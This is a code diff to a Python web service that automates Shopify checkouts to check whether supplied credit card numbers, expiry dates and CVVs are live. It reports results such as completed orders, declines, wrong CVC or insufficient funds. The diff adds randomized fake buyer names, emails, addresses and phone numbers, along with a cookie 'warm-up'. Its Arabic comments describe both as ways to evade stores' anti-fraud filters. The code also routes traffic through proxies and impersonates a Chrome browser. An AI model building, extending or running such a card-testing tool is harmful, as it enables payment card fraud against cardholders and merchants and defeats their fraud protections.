@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V30 (Strict Tunnel)"):
+def safe_response(msg, raw_data, price, gate="Shopify Payments"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -31,7 +31,7 @@ def safe_response(msg, raw_data, price, gate="Python Dynamic V30 (Strict Tunnel)
 def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
     try:
         cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
-        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "", "-"))
+        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "", "-", "Unknown"))
         cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
         if len(yy) == 2: yy = "20" + yy
 
@@ -42,18 +42,33 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
         proxy_url = format_proxy(proxy)
         proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
+        # 🔥 توليد هويات بشرية حقيقية وعناوين غير محروقة للهروب من الفلتر الأمني
+        first_names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "William"]
+        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson"]
+        fn = random.choice(first_names)
+        ln = random.choice(last_names)
+        email = f"{fn.lower()}{ln.lower()}{random.randint(100, 999)}@gmail.com"
+        streets = ["W 85th St", "E 22nd St", "Broadway", "Park Ave", "Lexington Ave", "Columbus Ave", "Madison Ave"]
+        address1 = f"{random.randint(100, 9999)} {random.choice(streets)}"
+
         buyer = {
-            "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
-            "address1": "8 The Green", "city": "Dover", "province": "DE", "zip": "19901", "country": "US", "phone": "3025551234"
+            "email": email, "first_name": fn, "last_name": ln,
+            "address1": address1, "city": "New York", "province": "NY", "zip": "10024", "country": "US", "phone": f"212{random.randint(2000000, 9999999)}"
         }
 
         with requests.Session(impersonate="chrome120") as session:
             session.verify = False
 
+            # 🔥 تسخين الجلسة (Session Warm-up) للحصول على كوكيز التتبع الشرعية
+            try:
+                session.get(store_url, timeout=10, proxies=proxies)
+                time.sleep(1)
+            except:
+                pass
+
             variant_id, price = None, "-"
             ep = f"{store_url}/products.json?limit=250"
             try:
-                # 🔥 إجبار البروكسي الصارم في كل طلب
                 r1 = session.get(ep, timeout=15, proxies=proxies)
                 if r1.status_code == 200:
                     data = r1.json()
@@ -71,16 +86,16 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                     price = "{:.2f}".format(pr)
                                     
                 else:
-                    return JSONResponse(content=safe_response("Blocked at Product Fetch", f"HTTP {r1.status_code}", "-"))
+                    return JSONResponse(content=safe_response("Blocked at Product Fetch", f"HTTP {r1.status_code}", "-", "Unknown"))
             except Exception as e:
-                return JSONResponse(content=safe_response("Proxy Connection Failed", str(e), "-"))
+                return JSONResponse(content=safe_response("Proxy Connection Failed", str(e), "-", "Unknown"))
 
             if not variant_id: 
-                return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-"))
+                return JSONResponse(content=safe_response("Product Not Found", "No variants available", "-", "Unknown"))
 
             add_res = session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1}, headers={"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"}, proxies=proxies)
             if add_res.status_code not in [200, 201]: 
-                return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price))
+                return JSONResponse(content=safe_response("Cart Add Blocked", f"HTTP {add_res.status_code}", price, "Unknown"))
 
             time.sleep(1.5)
             
@@ -88,9 +103,9 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             html_chk = res_chk.text
             final_url = str(res_chk.url)
 
-            if res_chk.status_code in [403, 429]: return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price))
+            if res_chk.status_code in [403, 429]: return JSONResponse(content=safe_response("WAF Blocked Checkout", html_chk[:80], price, "Unknown"))
             if 'hcaptcha' in html_chk.lower() or 'g-recaptcha' in html_chk.lower() or 'challenge-platform' in html_chk.lower():
-                return JSONResponse(content=safe_response("Store Demands Captcha", html_chk[:80], price))
+                return JSONResponse(content=safe_response("Store Demands Captcha", html_chk[:80], price, "Unknown"))
 
             is_graphql = False
             session_token, checkout_token = None, None
@@ -107,7 +122,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 jwt_match = re.search(r'(eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})', html_chk)
                 if jwt_match: is_graphql = True; session_token = jwt_match.group(1)
 
-            if not is_graphql: return JSONResponse(content=safe_response("Token Not Found", "Classic Token", price))
+            if not is_graphql: return JSONResponse(content=safe_response("Token Not Found", "Classic Token", price, "Unknown"))
             if not checkout_token: checkout_token = "unknown"
 
             pci_headers = {
@@ -118,7 +133,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             }
             res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
             if res_pci.status_code != 200: res_pci = session.post("https://deposit.us.shopifycs.com/sessions", json={"credit_card": {"number": cc_num, "month": mm, "year": yy, "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers, proxies=proxies)
-            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
+            if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price, "Unknown"))
             card_session_id = res_pci.json().get("id")
 
             flat_address = {
@@ -195,10 +210,10 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             res_prop_json = res_prop.json()
             
             data_obj = res_prop_json.get('data')
-            if not data_obj: return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price))
+            if not data_obj: return JSONResponse(content=safe_response("Proposal Rejected by Store", res_prop.text[:250], price, "Unknown"))
                 
             queue_token = data_obj.get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
-            if not queue_token: return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price))
+            if not queue_token: return JSONResponse(content=safe_response("Proposal Failed", res_prop.text[:250], price, "Unknown"))
             
             time.sleep(4.5)
             
@@ -224,11 +239,13 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 tax_constraint = {"value": {"amount": tax_val['amount'], "currencyCode": tax_val['currencyCode']}}
                 
             gateway_id = "bfe4013b52b37df95b64c063a41da319"
+            gateway_display = "Shopify Payments"
             avail_payments = seller_proposal.get('payment', {}).get('availablePaymentLines', [])
             for p in avail_payments:
                 pm = p.get('paymentMethod', {})
                 if pm.get('paymentMethodIdentifier'):
                     gateway_id = pm.get('paymentMethodIdentifier')
+                    gateway_display = pm.get('name', 'Shopify Payments').replace('_', ' ').title()
                     if pm.get('name') == 'shopify_payments': break
                     
             delivery_handle = "any"
@@ -350,14 +367,14 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 if errs:
                     err_code = errs[0].get('code', '')
                     if err_code == 'ARTIFACT_DISSATISFACTION':
-                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub_text[:400], price))
+                        return JSONResponse(content=safe_response("Declined: Anti-Fraud Risk Block 🛡️", res_sub_text[:400], price, gateway_display))
                     msg = errs[0].get('localizedMessage', 'Rejected')
                 else:
                     msg = 'Rejected'
-                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub_text[:400], price))
+                return JSONResponse(content=safe_response(f"Shopify System Rejected: {msg}", res_sub_text[:400], price, gateway_display))
             
             if sub_typename == 'SubmitFailed':
-                return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed (No Receipt)", price))
+                return JSONResponse(content=safe_response("Declined: Silent Gateway Rejection 💳", "SubmitFailed (No Receipt)", price, gateway_display))
 
             if sub_typename in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                 receipt_id = sub_data.get('receipt', {}).get('id')
@@ -365,16 +382,16 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                     err = sub_data.get('receipt', {}).get('processingError', {}).get('code')
                     if err:
                         if err == 'CARD_DECLINED':
-                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price))
-                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub_text[:400], price))
-                    return JSONResponse(content=safe_response("Order processing 💎", "No Receipt ID", price))
+                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price, gateway_display))
+                        return JSONResponse(content=safe_response(f"Declined: {err}", res_sub_text[:400], price, gateway_display))
+                    return JSONResponse(content=safe_response("Order processing 💎", "No Receipt ID", price, gateway_display))
             elif not sub_typename:
                 if not sub_data:
-                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub_text[:400], price))
+                    return JSONResponse(content=safe_response("Empty Submit Response (Check status)", res_sub_text[:400], price, gateway_display))
             
             receipt_id = sub_data.get('receipt', {}).get('id')
             if not receipt_id: 
-                return JSONResponse(content=safe_response("Submit Failed", res_sub_text[:400], price))
+                return JSONResponse(content=safe_response("Submit Failed", res_sub_text[:400], price, gateway_display))
 
             poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
             poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
@@ -384,19 +401,19 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 if res_poll.status_code == 200:
                     p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                     if p_type == 'ProcessedReceipt': 
-                        return JSONResponse(content=safe_response("Order completed 💎", "Success", price))
+                        return JSONResponse(content=safe_response("Order completed 💎", "Success", price, gateway_display))
                     elif p_type == 'FailedReceipt':
                         err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                         if err == 'CARD_DECLINED':
-                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price))
-                        if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", err, price))
-                        elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", err, price))
-                        elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", err, price))
-                        elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", err, price))
-                        return JSONResponse(content=safe_response(f"Declined: {err}", err, price))
+                            return JSONResponse(content=safe_response("Declined: CARD_DECLINED 💳", err, price, gateway_display))
+                        if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", err, price, gateway_display))
+                        elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", err, price, gateway_display))
+                        elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", err, price, gateway_display))
+                        elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", err, price, gateway_display))
+                        return JSONResponse(content=safe_response(f"Declined: {err}", err, price, gateway_display))
                 time.sleep(1.5)
                 
-            return JSONResponse(content=safe_response("Bank Timeout", "Waited 9 secs for bank", price))
+            return JSONResponse(content=safe_response("Bank Timeout", "Waited 9 secs for bank", price, gateway_display))
 
     except Exception as e:
-        return JSONResponse(content=safe_response("System Error", str(e), "-"))
+        return JSONResponse(content=safe_response("System Error", str(e), "-", "Unknown"))
